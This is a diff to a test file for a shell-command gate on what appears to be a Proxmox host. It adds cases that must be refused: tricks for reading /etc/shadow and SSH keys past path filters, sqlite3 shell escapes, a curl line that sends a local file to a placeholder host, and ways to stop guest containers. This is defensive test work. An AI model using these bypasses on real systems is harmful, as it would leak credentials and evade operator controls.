@@ -17,9 +17,8 @@ CASES = [
     ("ro", "curl -s http://127.0.0.1:3000/health", 1),
     ("ro", "pct exec 101 -- curl -s -o /dev/null -w %{http_code} http://127.0.0.1/", 1),
     ("ro", "curl -fsS -m 5 -H 'Host: app.example.com' https://127.0.0.1/", 1),
-    ("ro", "pct exec 103 -- pm2 jlist", 1),
+    ("ro", "pct exec 103 -- pm2 ls", 1),
     ("ro", "pct list 2>/dev/null", 1),
-    ("ro", "pct exec 101 -- sqlite3 -readonly /var/lib/app/app.db 'select count(*) from users'", 1),
     ("ro", "pct exec 101 -- cat /etc/nginx/sites-enabled/default", 1),
     ("ro", "pct exec 101 -- tailscale status", 1),
     ("ro", "pct exec 104 -- tailscale funnel status", 1),
@@ -33,6 +32,11 @@ CASES = [
     ("ro", "ip -br addr", 1),
     ("ro", "ip route show", 1),
     ("ro", "find /var/log -name '*.log' -mmin -60", 1),
+    ("ro", "systemctl --no-pager status nginx", 1),
+    ("ro", "systemctl --failed", 1),
+    ("ro", "ps -eo pid,etime,args", 1), ("ro", "ps aux", 1), ("ro", "ps axo pid,etime", 1),
+    ("ro", "grep -rn error /var/log/nginx", 1), ("ro", "grep -H -r -v -E '^[[:space:]]*(#|$)' /etc/cron.d/", 1),
+    ("ro", "curl -s -w %{http_code} -o /dev/null http://127.0.0.1/", 1),
     ("ro", "awk '{print $1}' /var/log/syslog | sort | uniq -c", 1),
     ("ro", "openssl x509 -in /etc/ssl/certs/app.pem -noout -enddate", 1),
     ("ro", "ssh-keygen -lf /etc/ssh/ssh_host_ed25519_key.pub", 1),
@@ -87,6 +91,28 @@ CASES = [
     ("ro", "openssl genrsa -out /tmp/k 2048", 0), ("ro", "ssh-keygen -t ed25519 -f /tmp/k", 0),
     ("ro", "journalctl --vacuum-size=1M", 0), ("ro", "timedatectl set-time 2001-01-01", 0),
     ("ro", "systemd-analyze set-log-level debug", 0),
+    # 2026-10-27 review: bypasses found by an independent review, all must be refused
+    ("ro", "echo .shell id | sqlite3 -readonly /x.db", 0),
+    ("ro", "sqlite3 -readonly x.db \"select writefile('/tmp/x','y')\"", 0),
+    ("ro", "pct exec 101 -- sqlite3 -readonly /opt/x.db 'select 1'", 0),
+    ("ro", "systemctl --no-pager restart example.service", 0), ("ro", "systemctl -q stop example", 0),
+    ("ro", "/var/lib/vz/example/cat /x", 0), ("ro", "pct exec 101 -- /tmp/cat /etc/hosts", 0),
+    ("ro", "echo link show | ip -b -", 0), ("ro", "sort --compress-program=/bin/true /x", 0),
+    ("ro", "smartctl --set=standby,now /dev/sda", 0), ("ro", "awk -i inplace 1 /etc/hosts", 0),
+    ("ro", "awk -f /tmp/prog.awk /x", 0), ("ro", "awk '@load \"x\"' /x", 0),
+    ("ro", "cat /etc/sha?ow", 0), ("ro", "cat /etc/sh{a,}dow", 0), ("ro", "cat /etc//shadow", 0),
+    ("ro", "cat /etc/./shadow", 0), ("ro", "cat /etc/x/../shadow", 0), ("ro", "cat /etc/sh''adow", 0),
+    ("ro", "cat ~root/.ssh/authorized_keys", 0), ("ro", "cat $HOME/x", 0), ("ro", r"cat /etc/shdow", 0), ("ro", "cat /etc/shdow", 0),
+    ("ro", "grep -r token /etc/pve", 0), ("ro", "grep -rn key /opt/app", 0), ("ro", "ps auxe", 0), ("ro", "ps eww", 0),
+    ("ro", "pct exec 103 -- pm2 jlist", 0), ("ro", "pm2 describe 0", 0),
+    ("ro", "curl -s -H @/etc/hosts http://a", 0), ("ro", "curl -s -w @/etc/hosts http://a", 0),
+    ("ro", "date -f /etc/hosts", 0), ("ro", "sha256sum -c /etc/hosts", 0), ("ro", "dig -f /etc/hosts", 0),
+    ("ro", "sh -c 'cat $0' /etc/shadow", 0), ("ro", "nginx -s stop", 0),
+    # guests must not stop through a side door, in either mode
+    ("rw", "pct exec 101 -- systemctl restart kexec.target", 0), ("rw", "pct exec 101 -- systemctl start exit.target", 0),
+    ("rw", "pct exec 101 -- systemctl --no-block reboot", 0), ("rw", "systemctl start pve-container@101", 0),
+    ("rw", "systemctl stop qemu-server@201", 0), ("rw", "lxc-stop -n 101", 0), ("rw", "pct exec 101 -- kill 1", 0),
+    ("rw", "pct exec 101 -- pkill -f nginx", 0), ("rw", "pct exec 101 -- systemctl kill nginx", 0),
     # secrets never leave the host
     ("ro", "cat /etc/shadow", 0), ("ro", "pct exec 101 -- cat /opt/app/.env", 0),
     ("ro", "cat /root/.ssh/id_ed25519", 0), ("ro", "cat /proc/1/environ", 0),
@@ -113,7 +139,10 @@ CASES = [
 ]
 
 # Site extensions from the config dir
-EXTRA = [("ro", "my-appcheck 101", 1), ("ro", "my-appcheck 101; id", 0), ("ro", "cat /srv/vault/x", 0)]
+EXTRA = [("ro", "my-appcheck 101", 1), ("ro", "my-appcheck 101; id", 0), ("ro", "cat /srv/vault/x", 0),
+         ("ro", "ls /etc/pve/lxc/*.conf", 1),                  # trusted verbatim via gate-ro-exact
+         ("ro", "ls /etc/pve/lxc/*.conf ; id", 0), ("ro", "ls /etc/pve/qemu-server/*.conf", 0),
+         ("rw", "ls /etc/pve/lxc/*.conf", 1)]
 
 
 def run(mode, cmd, conf):
@@ -130,6 +159,8 @@ def main():
             f.write("# site check scripts\nmy-appcheck\n")
         with open(os.path.join(conf, "gate-deny-read"), "w") as f:
             f.write("/srv/vault\n")
+        with open(os.path.join(conf, "gate-ro-exact"), "w") as f:
+            f.write("# fixed monitoring sweeps\nls /etc/pve/lxc/*.conf\n")
         for cases, d in ((CASES, empty), (EXTRA, conf)):
             for mode, cmd, want in cases:
                 got, err = run(mode, cmd, d)
